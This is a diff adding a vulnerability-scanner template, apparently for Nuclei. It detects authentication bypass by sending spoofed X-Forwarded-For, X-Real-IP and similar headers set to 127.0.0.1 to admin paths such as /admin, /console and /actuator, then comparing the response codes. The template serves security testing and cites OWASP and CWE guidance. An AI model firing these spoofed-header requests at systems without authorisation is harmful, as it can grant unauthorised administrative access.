@@ -1,0 +1,54 @@
+# gap: x-forwarded-for-auth-bypass
+id: x-forwarded-for-auth-bypass
+
+info:
+  name: Authentication Bypass via X-Forwarded-For Header
+  author: TyrusRC
+  severity: high
+  description: |
+    Detects authentication bypass by injecting internal IP addresses in
+    X-Forwarded-For, X-Real-IP, and X-Originating-IP headers. Applications
+    that trust these headers for IP-based access control allow an attacker
+    to bypass authentication restrictions by spoofing a trusted source IP.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema
+    - https://cwe.mitre.org/data/definitions/290.html
+  tags: custom,auth-bypass,headers,xff
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Real-IP: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        Accept: */*
+
+    payloads:
+      path:
+        - "/admin"
+        - "/admin/"
+        - "/manager"
+        - "/management"
+        - "/dashboard"
+        - "/internal"
+        - "/api/admin"
+        - "/console"
+        - "/actuator"
+    stop-at-first-match: true
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 401 || status_code_1 == 403'
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
